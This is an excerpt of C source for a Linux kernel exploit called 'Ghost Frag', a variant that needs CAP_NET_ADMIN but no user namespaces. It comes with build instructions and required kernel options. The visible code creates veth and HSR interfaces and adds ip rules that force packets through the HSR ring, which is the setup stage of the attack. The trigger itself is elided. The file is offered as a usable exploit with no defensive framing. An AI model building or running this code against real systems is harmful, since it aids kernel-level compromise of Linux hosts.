//
// ghost_frag-hsr-cap.c - Ghost Frag: HSR + CAP_NET_ADMIN (no namespaces)
//
// Same exploit without user namespaces. Uses ip rule to force packets
// through HSR ring instead of loopback.
//
// Requires: CAP_NET_ADMIN, CONFIG_IP_MULTIPLE_TABLES, CONFIG_HSR,
//           CONFIG_AF_RXRPC
// Build:    gcc -O2 -o ghost_frag-hsr-cap ghost_frag-hsr-cap.c
//
...
static int setup_network(void)
{
    ...
    run_cmd("ip link set vethA0 up; ip link set vethA1 up");
    run_cmd("ip link set vethB0 up; ip link set vethB1 up");
    run_cmd("ip link add hsr0 type hsr slave1 vethA0 slave2 vethB0 supervision 0 version 1");
    run_cmd("ip link add hsr1 type hsr slave1 vethA1 slave2 vethB1 supervision 0 version 1");
    run_cmd("ip addr add 10.0.0.1/24 dev hsr0; ip link set hsr0 up");
    run_cmd("ip addr add 10.0.0.2/24 dev hsr1; ip link set hsr1 up");
    enable_sg("hsr0"); enable_sg("hsr1");
    ...
    run_cmd("ip route add 10.0.0.1 dev hsr1 table 100");
    run_cmd("ip rule add priority 101 from 10.0.0.1 iif lo lookup 101");
    run_cmd("ip route add 10.0.0.2 dev hsr0 table 101");
    sleep(2);
    return 0;
}
...
static void cleanup_network(void)
{
    ...
    run_cmd("ip link del hsr0 2>/dev/null; ip link del hsr1 2>/dev/null");
    run_cmd("ip link del vethA0 2>/dev/null; ip link del vethB0 2>/dev/null");
}
...
int main(void)
{
    ...
    fprintf(stderr,
        "\n  Ghost Frag - HSR + CAP_NET_ADMIN (no namespaces)\n"
